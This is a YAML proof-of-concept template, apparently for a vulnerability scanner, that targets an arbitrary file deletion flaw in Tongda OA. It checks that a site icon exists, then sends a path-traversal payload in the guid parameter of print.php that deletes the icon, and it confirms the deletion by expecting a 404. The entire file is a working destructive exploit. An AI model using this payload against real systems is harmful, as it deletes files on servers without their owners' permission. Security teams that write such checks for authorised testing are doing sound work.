name: poc-yaml-tongdaoa-arbitraryfiledeletion.yml
rules:
  - method: GET
    path: /static/images/tongda.ico
    follow_redirects: false
    expression: |
      response.status == 200 && response.content_type.contains("image/x-icon")
  - method: POST
    path: >-
      /module/appbuilder/assets/print.php?guid=../../../webroot/static/images/tongda.ico
    follow_redirects: true
    expression: >
      response.status == 200 && response.body.bcontains(bytes("general/appbuilder/web/download.php"))
  - method: GET
    path: >-
      /static/images/tongda.ico
    follow_redirects: true
    expression: |
      response.status == 404
detail:
  author: su(https://suzzz112113.github.io/#blog)
  links:
